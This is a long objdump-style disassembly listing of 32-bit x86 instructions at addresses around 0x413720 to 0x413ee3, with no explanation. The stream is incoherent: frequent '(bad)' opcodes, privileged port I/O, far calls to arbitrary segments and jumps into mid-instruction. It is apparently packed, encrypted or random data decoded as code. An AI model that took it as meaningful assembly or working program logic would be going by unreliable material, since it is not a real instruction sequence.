  41371f:	jnp    0x413710
  413721:	push   esp
  413722:	push   esp
  413723:	loop   0x41378c
  413725:	cs jne 0x4137a3
  413728:	cmc    
  413729:	in     al,dx
  41372a:	loope  0x413724
  41372c:	mov    bl,BYTE PTR [esi+0x4a]
  41372f:	loop   0x413760
  413731:	push   esp
  413732:	mov    al,ds:0x27c5ed9e
  413737:	cmc    
  413738:	fdiv   DWORD PTR [ebx+0x3a5944cf]
  41373e:	pop    edx
  41373f:	out    dx,al
  413740:	lods   eax,DWORD PTR ds:[esi]
  413741:	cmp    ebx,ebx
  413743:	rcl    BYTE PTR [ecx-0x5e],1
  413746:	or     DWORD PTR [eax+0x60519dcc],esp
  41374c:	outs   dx,DWORD PTR gs:[esi]
  41374e:	test   BYTE PTR gs:[esi],bh
  413751:	or     BYTE PTR [edi],dh
  413753:	test   al,0x15
  413755:	mov    edx,0x7e45586d
  41375a:	lods   al,BYTE PTR ds:[esi]
  41375b:	adc    cl,BYTE PTR [ebp+0xa]
  41375e:	pop    ss
  41375f:	or     al,0x22
  413761:	arpl   WORD PTR [ecx+edi*1-0x40c3d242],si
  413768:	stos   DWORD PTR es:[edi],eax
  413769:	dec    edi
  41376a:	adc    al,0xe7
  41376c:	sahf   
  41376d:	adc    al,0xcb
  41376f:	mov    di,0xe6a8
  413773:	adc    DWORD PTR [eax],ebp
  413775:	imul   edi,eax,0x5d517b91
  41377b:	cld    
  41377c:	pop    eax
  41377d:	push   eax
  41377e:	std    
  41377f:	mov    edi,0xdf912c56
  413784:	xchg   edx,eax
  413785:	(bad)  
  413786:	sar    BYTE PTR [esi+ecx*1-0x2d1b00a6],1
  41378d:	mov    al,ds:0xd6365530
  413792:	(bad)  [ebp+0x5c]
  413795:	mov    bl,0xb3
  413797:	jns    0xaec9206d
  41379d:	sub    esp,DWORD PTR [ecx-0x57]
  4137a0:	shl    ah,0x22
  4137a3:	mov    al,ds:0xd97e7408
  4137a8:	fcomp  QWORD PTR ds:[eax+0x5]
  4137ac:	jns    0x41382b
  4137ae:	jo     0x41373a
  4137b0:	ficomp WORD PTR [ecx*8+0x6e7b58c4]
  4137b7:	pushf  
  4137b8:	mul    DWORD PTR [ebx]
  4137ba:	clc    
  4137bb:	pushf  
  4137bc:	in     eax,0x73
  4137be:	fmul   st(0),st
  4137c0:	mov    cl,0x15
  4137c2:	mov    al,0x5c
  4137c4:	or     al,0x6a
  4137c6:	ret    
  4137c7:	int3   
  4137c8:	test   DWORD PTR [ebp-0x3],0xf8cca29b
  4137cf:	pop    ebx
  4137d0:	mulps  xmm0,XMMWORD PTR [ebp-0x98fc109]
  4137d7:	and    bh,cl
  4137d9:	dec    edx
  4137da:	push   0x19
  4137dc:	aam    0x56
  4137de:	mov    eax,0xfdd11209
  4137e3:	test   al,0xa7
  4137e5:	lock mov ebp,0x7422aa61
  4137eb:	aaa    
  4137ec:	addr16 xor eax,0xa62d4636
  4137f2:	loopne 0x413833
  4137f4:	shl    DWORD PTR [ebx+0x730bbc5b],cl
  4137fa:	pop    ecx
  4137fb:	inc    edi
  4137fc:	neg    cl
  4137fe:	adc    edi,DWORD PTR [ecx]
  413800:	mov    ds:0x182a2ff9,al
  413805:	loop   0x41381b
  413807:	ret    0x657
  41380a:	push   edi
  41380b:	sbb    ecx,DWORD PTR [edi+0x45]
  41380e:	adc    DWORD PTR [esi-0x647692ea],esp
  413814:	dec    ecx
  413815:	dec    ebx
  413816:	out    dx,eax
  413817:	sub    BYTE PTR [edx],al
  413819:	mov    cl,0x31
  41381b:	xor    eax,0x4fb711f3
  413820:	dec    eax
  413821:	inc    eax
  413822:	mov    eax,0x351fb246
  413827:	jmp    0x41389a
  413829:	das    
  41382a:	cmp    ah,dh
  41382c:	mov    dh,BYTE PTR [edx+0x1d]
  41382f:	fldcw  WORD PTR [ebp+0x75]
  413832:	mov    ah,0xdf
  413834:	fldcw  WORD PTR [ecx+eax*8-0x7c66e5ce]
  41383b:	out    0x41,al
  41383d:	int3   
  41383e:	ins    DWORD PTR es:[edi],dx
  41383f:	add    dl,bh
  413841:	arpl   WORD PTR [edx],sp
  413843:	jne    0x4138a5
  413845:	mov    al,0x58
  413847:	inc    ebp
  413848:	in     al,dx
  413849:	rcl    BYTE PTR [edx],1
  41384b:	adc    cl,BYTE PTR [edi+0x69b0d592]
  413851:	add    DWORD PTR [ecx+0x40],ebp
  413854:	mov    al,ds:0x7570fb8d
  413859:	adc    eax,0x71503239
  41385e:	mov    ecx,0x7a76f1e4
  413863:	icebp  
  413864:	not    DWORD PTR [ebp+edx*8+0x6a]
  413868:	pushf  
  413869:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41386a:	cmc    
  41386b:	inc    eax
  41386c:	(bad)  
  41386d:	shl    edi,1
  41386f:	push   es
  413870:	sbb    edx,DWORD PTR [esi]
  413872:	push   edi
  413873:	repz mov eax,ds:0x20fa7d5f
  413879:	pop    es
  41387a:	and    al,0x2c
  41387c:	rol    esp,1
  41387e:	cld    
  41387f:	pusha  
  413880:	push   ds
  413881:	call   0x4b2a:0x1ddce3f3
  413888:	in     al,0x45
  41388a:	push   ebp
  41388b:	cmp    al,0xdb
  41388d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41388e:	out    dx,al
  41388f:	xchg   ebp,eax
  413890:	dec    ecx
  413891:	sbb    BYTE PTR [eax+0x66],0x80
  413895:	xor    BYTE PTR [edi+0x7019d79],0x76
  41389c:	rcl    BYTE PTR [edx+0x55e988de],1
  4138a2:	js     0x4138f5
  4138a4:	cmp    al,0x36
  4138a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138a8:	mov    esp,0x38cf8920
  4138ad:	jo     0x4138b2
  4138af:	sub    ah,BYTE PTR [edi]
  4138b1:	aas    
  4138b2:	mov    bh,0xc0
  4138b4:	cs pushf 
  4138b6:	jnp    0x413918
  4138b8:	mov    dl,0x19
  4138ba:	jnp    0x4138ec
  4138bc:	add    bl,ah
  4138be:	jnp    0x413899
  4138c0:	jecxz  0x413900
  4138c2:	(bad)  
  4138c3:	(bad)  
  4138c4:	mov    ebx,0x5e3f1cae
  4138c9:	fs jne 0x413867
  4138cc:	jge    0x41390d
  4138ce:	loop   0x413912
  4138d0:	add    eax,0xbe8e1fc0
  4138d5:	(bad)  
  4138d6:	push   ss
  4138d7:	repz mov dh,0x1d
  4138da:	cmp    BYTE PTR [ebx+0x1e],bh
  4138dd:	pop    ebx
  4138de:	es jmp 0x7ae824cf
  4138e4:	mov    esi,0xea0cf911
  4138e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138ea:	lock dec esp
  4138ec:	mov    ebp,0x9816a9f0
  4138f1:	inc    edx
  4138f2:	ss mov dl,0x1c
  4138f5:	jg     0x413952
  4138f7:	loopne 0x413973
  4138f9:	jno    0x4138b3
  4138fb:	cli    
  4138fc:	inc    eax
  4138fd:	dec    edx
  4138fe:	push   eax
  4138ff:	inc    ebx
  413900:	js     0x4138f7
  413902:	jae    0x41395a
  413904:	sahf   
  413905:	pop    eax
  413906:	or     bh,dl
  413908:	fild   DWORD PTR [ebx+0x68]
  41390b:	adc    ebx,DWORD PTR [edi-0x7c]
  41390e:	and    al,0xf9
  413910:	pop    ebp
  413911:	(bad)  
  413912:	mov    eax,ds:0xabf503e5
  413917:	stc    
  413918:	mov    ebx,0xd8b6fdd4
  41391d:	icebp  
  41391e:	adc    cl,ch
  413920:	jns    0x41390d
  413922:	sub    dl,BYTE PTR [edx]
  413924:	lods   al,BYTE PTR ds:[esi]
  413925:	loopne 0x413973
  413927:	fld    st(5)
  413929:	pusha  
  41392a:	sbb    ecx,DWORD PTR [ebp+esi*2+0x8]
  41392e:	fild   DWORD PTR [ebp+0x3c751a9f]
  413934:	pop    ds
  413935:	stos   DWORD PTR es:[edi],eax
  413936:	pushf  
  413937:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413938:	pop    es
  413939:	dec    ebx
  41393a:	(bad)  
  41393b:	or     ebp,DWORD PTR [eax]
  41393d:	lods   eax,DWORD PTR ds:[esi]
  41393e:	retf   
  41393f:	retf   0x4cb6
  413942:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413943:	jg     0x4138fe
  413945:	or     DWORD PTR [eax+0x1718e31d],edi
  41394b:	lea    ecx,[edi-0x755e174]
  413951:	cmc    
  413952:	call   0x3236adf3
  413957:	xchg   BYTE PTR [eax],dh
  413959:	adc    eax,0x43d62dec
  41395e:	jnp    0x413973
  413960:	dec    ecx
  413961:	mov    dh,0x75
  413963:	jbe    0x413959
  413965:	xor    al,0xe7
  413967:	jge    0x4139ca
  413969:	jg     0x4139e7
  41396b:	je     0x4139db
  41396d:	popf   
  41396e:	push   ss
  41396f:	mov    eax,0x2e3665a2
  413974:	adc    eax,esi
  413976:	xchg   DWORD PTR [edx+0x35],ebx
  413979:	sub    eax,0x8514c127
  41397e:	and    al,0xd9
  413980:	int3   
  413981:	lahf   
  413982:	call   0x868b:0x2d21e364
  413989:	mov    ch,0x63
  41398b:	mov    bl,0x2b
  41398d:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41398f:	js     0x413947
  413991:	ss xchg edi,eax
  413993:	mov    edi,DWORD PTR [edx-0x21]
  413996:	dec    esp
  413998:	retf   0x9a8d
  41399b:	jae    0x413990
  41399d:	mov    edi,0xa0637533
  4139a2:	xchg   esi,eax
  4139a3:	fs cmc 
  4139a5:	test   BYTE PTR [edx-0x60093f47],ch
  4139ab:	mov    edi,0x51772600
  4139b0:	sbb    edi,ebx
  4139b2:	xchg   ebx,eax
  4139b3:	cmc    
  4139b4:	add    edx,DWORD PTR [eax]
  4139b6:	jmp    0x4139fc
  4139b8:	cmc    
  4139b9:	retf   
  4139ba:	xor    eax,DWORD PTR [ebx-0x144d970c]
  4139c0:	inc    esi
  4139c1:	mov    ecx,0x2e7e7cf7
  4139c6:	sub    al,0x56
  4139c8:	pop    esp
  4139c9:	int3   
  4139ca:	pop    ds
  4139cb:	pop    esi
  4139cc:	call   0xa2ac:0x1049c0a4
  4139d3:	aam    0x86
  4139d5:	jnp    0x413a18
  4139d7:	and    al,0x5f
  4139d9:	add    al,0xb0
  4139db:	imul   ebx,DWORD PTR ds:0x4a597b84,0xffffffd6
  4139e2:	lahf   
  4139e3:	fbld   TBYTE PTR [ecx-0x40a4b4af]
  4139e9:	into   
  4139ea:	xchg   esp,eax
  4139eb:	jmp    0x4938437f
  4139f0:	shr    BYTE PTR [ecx+0x1dc3d7a7],0xaf
  4139f7:	pop    edi
  4139f8:	inc    edx
  4139f9:	outs   dx,DWORD PTR ds:[esi]
  4139fa:	aam    0x22
  4139fc:	nop
  4139fd:	das    
  4139fe:	cmp    esp,DWORD PTR [ebp+0x46e20d80]
  413a04:	jmp    0x7a89:0x93f32bd9
  413a0b:	ret    0x339b
  413a0e:	shr    DWORD PTR [edi-0x38],1
  413a11:	fdivr  st(1),st
  413a13:	sub    BYTE PTR [edi-0x38],bl
  413a16:	or     bl,ah
  413a18:	push   cs
  413a19:	loope  0x413a76
  413a1b:	jo     0x413a51
  413a1d:	mov    bh,0x73
  413a1f:	dec    esp
  413a20:	pop    ss
  413a21:	jmp    0x413a31
  413a23:	jmp    0x413a2a
  413a25:	outs   dx,BYTE PTR ds:[esi]
  413a26:	mov    ?,WORD PTR [eax+0x4d]
  413a29:	inc    esi
  413a2a:	test   eax,0x21f268db
  413a2f:	aas    
  413a30:	lahf   
  413a31:	inc    esp
  413a32:	push   eax
  413a33:	adc    DWORD PTR [edx+0x26],edx
  413a36:	sub    DWORD PTR [eax+0x4e],edx
  413a39:	sbb    ebx,DWORD PTR [ebx-0x16]
  413a3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a3d:	cli    
  413a3e:	mov    esi,0x753dcec7
  413a43:	in     al,dx
  413a44:	add    DWORD PTR [eiz*1+0x691d5c59],eax
  413a4b:	jg     0x413a7e
  413a4d:	and    DWORD PTR [ebx+0x0],0x1a
  413a51:	or     eax,0xbc76c825
  413a56:	aas    
  413a57:	les    ebp,FWORD PTR [esi+ebx*2]
  413a5a:	ja     0x413a53
  413a5c:	lods   eax,DWORD PTR ds:[esi]
  413a5d:	js     0x413a8b
  413a5f:	loop   0x413a4b
  413a61:	sub    eax,DWORD PTR [ebp+esi*2-0x51]
  413a65:	fstp   st(1)
  413a67:	out    0xe7,eax
  413a69:	ficomp WORD PTR [edi-0x66]
  413a6c:	(bad)  
  413a6d:	sub    ebx,ebp
  413a6f:	dec    eax
  413a70:	loop   0x413a0f
  413a72:	push   edi
  413a73:	pop    ebx
  413a74:	pop    eax
  413a75:	and    cl,al
  413a77:	mov    esp,edi
  413a79:	sahf   
  413a7a:	shl    BYTE PTR [eax-0x8a886c2],1
  413a80:	out    dx,eax
  413a81:	xchg   esi,eax
  413a82:	leave  
  413a83:	sub    al,0x72
  413a85:	inc    ebp
  413a86:	sub    ecx,ecx
  413a88:	shl    ecx,1
  413a8a:	jecxz  0x413b06
  413a8c:	out    0xfe,al
  413a8e:	push   eax
  413a8f:	das    
  413a90:	mov    ch,0x64
  413a92:	aaa    
  413a93:	repz rcl BYTE PTR [ecx],1
  413a96:	mov    esi,0xbf7bf572
  413a9b:	imul   esp,DWORD PTR [edx+ecx*8],0x16d79d49
  413aa2:	ffree  st(3)
  413aa4:	and    dh,ah
  413aa6:	call   FWORD PTR [ebx+0x783ee1f3]
  413aac:	adc    al,0x2f
  413aae:	(bad)  
  413ab0:	push   edi
  413ab1:	jns    0x413b14
  413ab3:	call   0xc2cbdf9e
  413ab8:	in     al,0x62
  413aba:	mov    dh,0xdd
  413abc:	setb   BYTE PTR [edi+0x50]
  413ac0:	inc    ebp
  413ac1:	push   esp
  413ac2:	cmc    
  413ac3:	push   es
  413ac4:	pop    es
  413ac5:	nop
  413ac6:	mov    ebp,0x915ffcc1
  413acb:	sub    eax,0x9959c872
  413ad0:	int3   
  413ad1:	inc    edi
  413ad2:	and    DWORD PTR ds:0xc33098b3,ebp
  413ad8:	push   ebp
  413ad9:	add    al,0xfd
  413adb:	xor    DWORD PTR [ebx-0x71],edi
  413ade:	dec    edx
  413adf:	xor    DWORD PTR [ecx+edx*2-0x6f],0xffffffff
  413ae4:	dec    esi
  413ae5:	push   esi
  413ae6:	xchg   esp,eax
  413ae7:	lea    esi,[edi+0x6]
  413aea:	mov    eax,ds:0x67f8cf20
  413aef:	ficom  DWORD PTR [eax+edi*8]
  413af2:	std    
  413af3:	bound  ebx,QWORD PTR [edi]
  413af5:	sbb    eax,0x476cea8
  413afa:	and    ah,dl
  413afc:	mov    esi,0xc3e8b4a1
  413b01:	hlt    
  413b02:	shr    BYTE PTR [edi-0x75],0x95
  413b06:	fisttp QWORD PTR [ebx]
  413b08:	fucom  st(2)
  413b0a:	cmp    eax,0x280ece1c
  413b0f:	xchg   ebx,eax
  413b10:	and    eax,0x72c6221f
  413b15:	jle    0x413b07
  413b17:	mov    al,0x96
  413b19:	push   ebx
  413b1a:	lds    ecx,FWORD PTR [edx-0x5d]
  413b1d:	ror    BYTE PTR [edi+0x6739e153],1
  413b23:	idiv   BYTE PTR [eax-0x77]
  413b26:	int3   
  413b27:	mov    dh,0x3b
  413b29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b2a:	daa    
  413b2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b2c:	dec    edi
  413b2d:	and    ch,BYTE PTR [edx+0x6f]
  413b30:	mov    ebp,0xf1faf189
  413b35:	push   edx
  413b36:	xchg   esi,eax
  413b37:	jp     0x413b93
  413b39:	cli    
  413b3a:	test   al,0x62
  413b3c:	mov    ds:0x300883e3,al
  413b41:	test   al,0x1b
  413b43:	inc    eax
  413b44:	fld    TBYTE PTR [edx+0x19]
  413b47:	clc    
  413b48:	div    DWORD PTR [esi+esi*4]
  413b4b:	std    
  413b4c:	jns    0x413b45
  413b4e:	push   ss
  413b4f:	(bad)  
  413b50:	adc    BYTE PTR [edx],bh
  413b52:	addr16 loopne 0x413b52
  413b55:	out    dx,al
  413b56:	loope  0x413b79
  413b58:	push   esi
  413b59:	or     ah,dl
  413b5b:	mov    esp,0x3493206d
  413b60:	adc    eax,0xef549b3d
  413b65:	shl    BYTE PTR ds:0x3b797c4d,0x91
  413b6c:	or     al,0x57
  413b6e:	fsubrp st(3),st
  413b70:	mov    bl,0x4a
  413b72:	icebp  
  413b73:	shr    DWORD PTR [ecx-0x7b],0xd7
  413b77:	(bad)  
  413b78:	and    bl,BYTE PTR [ebx+0x78584ea0]
  413b7e:	in     al,dx
  413b7f:	inc    esi
  413b80:	test   eax,0x5e1d69ef
  413b85:	out    dx,al
  413b86:	call   0x8cfe1b3
  413b8b:	inc    ebx
  413b8c:	loop   0x413b75
  413b8e:	pop    es
  413b8f:	loop   0x413bee
  413b91:	dec    ebx
  413b92:	adc    DWORD PTR [bp+di+0x953],0x683edce7
  413b9b:	sub    al,0x2a
  413b9d:	xchg   ecx,eax
  413b9e:	mov    al,ds:0xdaf0e77b
  413ba3:	test   al,0x57
  413ba5:	pop    edi
  413ba6:	add    eax,0x496eac2c
  413bab:	add    al,0xc5
  413bad:	hlt    
  413bae:	mov    ds:0x6b50ce70,al
  413bb3:	pushf  
  413bb4:	jo     0x413bdb
  413bb6:	aaa    
  413bb7:	or     ah,ch
  413bb9:	and    dh,BYTE PTR [edx+eax*2-0x43a97211]
  413bc0:	jb     0x413bb0
  413bc2:	dec    edx
  413bc3:	mov    ds:0xda0b5734,al
  413bc8:	(bad)  
  413bc9:	fidiv  WORD PTR [ebx]
  413bcb:	xchg   ebp,eax
  413bcc:	repz imul DWORD PTR [esi-0x48]
  413bd0:	cmp    al,0x7e
  413bd2:	aam    0x6d
  413bd4:	rcr    DWORD PTR [edi],cl
  413bd6:	mov    fs,esi
  413bd8:	cmc    
  413bd9:	loop   0x413ba7
  413bdb:	in     al,0x3d
  413bdd:	leave  
  413bde:	push   0x605584da
  413be3:	in     eax,dx
  413be4:	call   0x62df:0xfa98a9c5
  413beb:	jne    0x413c55
  413bed:	adc    eax,eax
  413bef:	lahf   
  413bf0:	pop    ebp
  413bf1:	cmp    eax,0x96980624
  413bf6:	adc    ecx,DWORD PTR [ebp+0x3a]
  413bf9:	pushf  
  413bfa:	scas   eax,DWORD PTR es:[edi]
  413bfb:	add    BYTE PTR [edx-0x4ff136ff],0x9a
  413c02:	call   0xeb1f:0x553d8715
  413c09:	inc    ecx
  413c0a:	sub    DWORD PTR [ecx+ecx*8-0x3a],edi
  413c0e:	jmp    0xc376:0x2c429c0d
  413c15:	mov    cl,0x8
  413c17:	xor    ebx,eax
  413c19:	jl     0x413c91
  413c1b:	lock pop ss
  413c1d:	(bad)  
  413c1e:	cmp    eax,0xda9f0bf4
  413c23:	lea    ebx,[edx]
  413c25:	dec    esi
  413c26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c27:	sbb    ah,BYTE PTR [eax]
  413c29:	mov    dh,0xf1
  413c2b:	sub    dh,ch
  413c2d:	das    
  413c2e:	push   es
  413c2f:	fidivr DWORD PTR [esi+0x295b6339]
  413c35:	(bad)  
  413c36:	aam    0x40
  413c38:	mov    bl,0xbd
  413c3a:	ficomp DWORD PTR [esi-0x58]
  413c3d:	fidivr DWORD PTR [ebp-0x85dce2b]
  413c43:	leave  
  413c44:	sbb    al,0x86
  413c46:	pop    ds
  413c47:	mov    cl,0x85
  413c49:	sbb    edx,DWORD PTR [eax]
  413c4b:	adc    BYTE PTR [ebx],dl
  413c4d:	ret    0x874c
  413c50:	imul   edi,DWORD PTR [ebx],0x41f4450c
  413c56:	dec    ecx
  413c57:	test   DWORD PTR [ebp-0x2],ebx
  413c5a:	jecxz  0x413c70
  413c5c:	leave  
  413c5d:	pop    ds
  413c5e:	in     eax,dx
  413c5f:	push   ss
  413c60:	lahf   
  413c61:	mov    ecx,0xc5ab6ff0
  413c66:	bound  ecx,QWORD PTR [ecx-0x66]
  413c69:	cs cmp cl,cl
  413c6c:	sbb    eax,0x9bd814aa
  413c71:	cmp    eax,0x6d051444
  413c76:	neg    DWORD PTR [esi+0x13d24f2b]
  413c7c:	sub    DWORD PTR [ebx-0xca8d42d],edi
  413c82:	test   BYTE PTR [ebp+0x290aae9],bh
  413c88:	clc    
  413c89:	(bad)  
  413c8a:	mov    edx,0x94c75ec4
  413c8f:	mov    edi,ebp
  413c91:	cdq    
  413c92:	das    
  413c93:	mov    edi,0x9e15b9d8
  413c98:	mov    bl,0xd6
  413c9a:	pushf  
  413c9b:	xchg   BYTE PTR [ebx+esi*2+0x74],cl
  413c9f:	aam    0xd8
  413ca1:	mov    esi,0xf29f7b92
  413ca6:	leave  
  413ca7:	ja     0x413cd0
  413ca9:	lahf   
  413caa:	repz das 
  413cac:	jno    0x413c7d
  413cae:	ret    
  413caf:	aaa    
  413cb0:	xchg   edx,eax
  413cb1:	into   
  413cb2:	das    
  413cb3:	inc    ebx
  413cb4:	inc    esp
  413cb5:	out    0x3d,al
  413cb7:	or     bh,BYTE PTR [ecx+ebx*4]
  413cba:	add    DWORD PTR [ebx],edi
  413cbc:	mov    BYTE PTR [eax+0x32],bl
  413cbf:	sbb    BYTE PTR [esi],bl
  413cc1:	imul   edi,DWORD PTR [eax+ebp*8+0x1e5d5d05],0x6bbd802c
  413ccc:	fnstenv [eax+0x584c66bf]
  413cd2:	xor    ecx,DWORD PTR [eax+edx*2]
  413cd5:	ror    ch,1
  413cd7:	cmp    ebp,0x6c53ec80
  413cdd:	jo     0x413caf
  413cdf:	stos   BYTE PTR es:[edi],al
  413ce0:	and    eax,0xe073de1c
  413ce5:	js     0x413d05
  413ce7:	mov    ebp,0x949ba02f
  413cec:	loop   0x413ced
  413cee:	retf   
  413cef:	shr    DWORD PTR [esi],cl
  413cf1:	jb     0x413d54
  413cf3:	(bad)  
  413cf4:	pop    edx
  413cf5:	dec    edx
  413cf6:	push   ss
  413cf7:	ret    0x5e69
  413cfa:	in     al,dx
  413cfb:	cmc    
  413cfc:	shr    edi,0xb9
  413cff:	mov    bl,0x20
  413d01:	and    eax,0x7e481d48
  413d06:	jno    0x413d7b
  413d08:	dec    ebx
  413d09:	mov    cl,0x30
  413d0b:	jg     0x413cc6
  413d0d:	(bad)  
  413d0e:	std    
  413d0f:	push   ecx
  413d10:	xor    DWORD PTR [ebx],edx
  413d12:	pop    ebp
  413d13:	fbld   TBYTE PTR [esp+ebp*4-0x79553d39]
  413d1a:	and    BYTE PTR [ebx+ebx*2+0x63fa8b3a],bh
  413d21:	popf   
  413d22:	dec    al
  413d24:	jp     0x413d2c
  413d26:	test   BYTE PTR [ebx-0xb],dl
  413d29:	ss retf 
  413d2b:	xor    al,0xc7
  413d2d:	js     0x413d2f
  413d2f:	int3   
  413d30:	cmp    DWORD PTR [edx-0x8f73966],0xb5fba56
  413d3a:	jmp    0x790cc733
  413d3f:	cmp    ch,ch
  413d41:	jno    0x413d4c
  413d43:	ror    ebp,cl
  413d45:	xor    edx,edx
  413d47:	mul    BYTE PTR [eax]
  413d49:	cmp    al,0xaf
  413d4b:	jge    0x413d49
  413d4d:	mov    bl,0xf8
  413d4f:	push   esi
  413d50:	ret    
  413d51:	sub    al,0xb0
  413d53:	stos   BYTE PTR es:[edi],al
  413d54:	popf   
  413d55:	push   edi
  413d56:	loope  0x413d9f
  413d58:	mov    ecx,0xa7b14b0d
  413d5d:	and    eax,ebp
  413d5f:	mov    BYTE PTR [ecx],bh
  413d61:	imul   eax,ecx,0xffffff96
  413d64:	and    DWORD PTR [esi+0x6d],ebx
  413d67:	cmc    
  413d68:	jo     0x413d66
  413d6a:	(bad)  
  413d6b:	(bad)  
  413d6c:	push   ebx
  413d6d:	mov    al,0x12
  413d6f:	imul   DWORD PTR [esi+0x4e]
  413d72:	lods   al,BYTE PTR ds:[esi]
  413d73:	(bad)  
  413d74:	loope  0x413d96
  413d76:	add    ah,ch
  413d78:	shl    BYTE PTR [esi+0x19060bb3],cl
  413d7e:	cs jle 0x413d79
  413d81:	leave  
  413d82:	mov    ch,BYTE PTR [esi]
  413d84:	adc    esp,esp
  413d86:	add    BYTE PTR [eax],0x5a
  413d89:	in     eax,dx
  413d8a:	ror    DWORD PTR [eax],1
  413d8c:	fcomp  DWORD PTR [ebx+0x30]
  413d8f:	add    BYTE PTR [edx-0x388b22bd],dh
  413d95:	icebp  
  413d96:	js     0x413e05
  413d98:	sub    BYTE PTR [esi],ah
  413d9a:	dec    eax
  413d9b:	retf   
  413d9c:	in     eax,0x9b
  413d9e:	rol    DWORD PTR [esi],0x82
  413da1:	mov    ?,WORD PTR [ebx-0x57ddfd63]
  413da7:	mov    eax,0xbb61ce2e
  413dac:	jnp    0x413dc6
  413dae:	addr16 sub eax,0x3588a6d3
  413db4:	adc    ah,BYTE PTR [edx-0x7d]
  413db7:	stos   DWORD PTR es:[edi],eax
  413db8:	jp     0x413d73
  413dba:	repz cmp al,0x7b
  413dbd:	and    edx,DWORD PTR [edi]
  413dbf:	jge    0x413def
  413dc1:	dec    eax
  413dc2:	enter  0xc55d,0xe8
  413dc6:	add    cl,cl
  413dc8:	clc    
  413dc9:	xor    esp,DWORD PTR [ecx]
  413dcb:	push   ss
  413dcc:	inc    ebp
  413dcd:	ficom  WORD PTR [esi+eiz*1+0xa]
  413dd1:	add    al,0x4
  413dd3:	jb     0x413e21
  413dd5:	popa   
  413dd6:	test   edi,ebp
  413dd8:	mov    cl,BYTE PTR [ebp+0x64]
  413ddb:	pusha  
  413ddc:	xchg   esp,eax
  413ddd:	jmp    0x413e06
  413ddf:	rol    edx,0x1b
  413de2:	stos   BYTE PTR es:[edi],al
  413de3:	xor    al,al
  413de5:	xor    eax,0xc9318836
  413dea:	pop    ecx
  413deb:	aam    0x39
  413ded:	adc    al,0xe6
  413def:	or     ecx,DWORD PTR [ebp-0x7d]
  413df2:	jl     0x413dd2
  413df4:	daa    
  413df5:	imul   esi,DWORD PTR [eax-0x5f70eb9d],0x34
  413dfc:	mov    cl,0xed
  413dfe:	fs das 
  413e00:	bnd jbe 0x413e7f
  413e03:	mov    al,BYTE PTR [edx]
  413e05:	nop
  413e06:	repz daa 
  413e08:	enter  0xb8f7,0xf6
  413e0c:	xchg   edi,eax
  413e0d:	shl    esi,0xd8
  413e10:	mov    ebp,0xbb5184a9
  413e15:	out    0x9,al
  413e17:	into   
  413e18:	push   eax
  413e19:	pop    esi
  413e1a:	outs   dx,DWORD PTR gs:[esi]
  413e1c:	popf   
  413e1d:	dec    eax
  413e1e:	fwait
  413e1f:	xchg   edi,eax
  413e20:	push   ecx
  413e21:	imul   BYTE PTR [eax]
  413e23:	cmp    ch,dl
  413e25:	pop    edi
  413e26:	out    dx,al
  413e27:	mov    eax,ds:0x65544a09
  413e2c:	dec    DWORD PTR [ebp+0x54e28a03]
  413e32:	add    edi,DWORD PTR [esi]
  413e34:	scas   al,BYTE PTR es:[edi]
  413e35:	pop    ds
  413e36:	mov    bh,0xbf
  413e38:	or     al,bh
  413e3a:	popf   
  413e3b:	div    BYTE PTR [edx]
  413e3d:	mov    cl,0xa5
  413e3f:	stos   BYTE PTR es:[edi],al
  413e40:	cs ja  0x413ebf
  413e43:	(bad)  
  413e44:	push   DWORD PTR [ecx]
  413e46:	sub    al,0x86
  413e48:	sub    al,0x70
  413e4a:	ja     0x413ea1
  413e4c:	add    eax,0x806c1c87
  413e51:	lods   eax,DWORD PTR ds:[esi]
  413e52:	jae    0x413e95
  413e54:	mov    WORD PTR [ebx-0x71],?
  413e57:	sbb    DWORD PTR [edi+0x5d32b4bf],eax
  413e5d:	mov    esi,0xf177fd99
  413e62:	pop    ebx
  413e63:	inc    edi
  413e64:	(bad)  
  413e65:	sbb    eax,0x7770181a
  413e6a:	jmp    0x675974ea
  413e6f:	icebp  
  413e70:	outs   dx,BYTE PTR ds:[esi]
  413e71:	in     eax,0x58
  413e73:	xchg   BYTE PTR [esi+0x38d2b2db],al
  413e79:	cmp    eax,0x1f904222
  413e7e:	push   ecx
  413e7f:	ror    BYTE PTR [ebp-0x739418cb],cl
  413e85:	lods   eax,DWORD PTR ds:[esi]
  413e86:	mov    esp,0x7b2be0ca
  413e8b:	sbb    eax,0x40b90d9f
  413e90:	pop    ss
  413e91:	loope  0x413e80
  413e93:	or     DWORD PTR [edx+0x2d],ebx
  413e96:	jecxz  0x413ea0
  413e98:	in     eax,dx
  413e99:	pop    ecx
  413e9a:	das    
  413e9b:	stc    
  413e9c:	hlt    
  413e9d:	popa   
  413e9e:	cmp    dh,BYTE PTR [eax-0x77705541]
  413ea4:	scas   al,BYTE PTR es:[edi]
  413ea5:	jne    0x413eba
  413ea7:	shl    ch,cl
  413ea9:	xor    al,0x4f
  413eab:	adc    bl,bh
  413ead:	stc    
  413eae:	mov    cl,0x6d
  413eb0:	icebp  
  413eb1:	test   DWORD PTR [esi-0x50],esp
  413eb4:	and    ebp,DWORD PTR [edi]
  413eb6:	mov    WORD PTR [ecx],ss
  413eb8:	cld    
  413eb9:	fcom   DWORD PTR [ebx]
  413ebb:	push   esi
  413ebc:	idiv   DWORD PTR [eax-0x74]
  413ebf:	loopne 0x413ee4
  413ec1:	jo     0x413efa
  413ec3:	cs fild QWORD PTR fs:[ecx-0x7c46622b]
  413ecb:	mov    ds:0xfca53b04,al
  413ed0:	out    dx,eax
  413ed1:	fwait
  413ed2:	inc    ecx
  413ed3:	fimul  WORD PTR [ecx+0x3208c2a6]
  413ed9:	aaa    
  413eda:	sub    dh,al
  413edc:	popa   
  413edd:	in     al,dx
  413ede:	enter  0x1b10,0x84
  413ee2:	popa   
  413ee3:	fwait
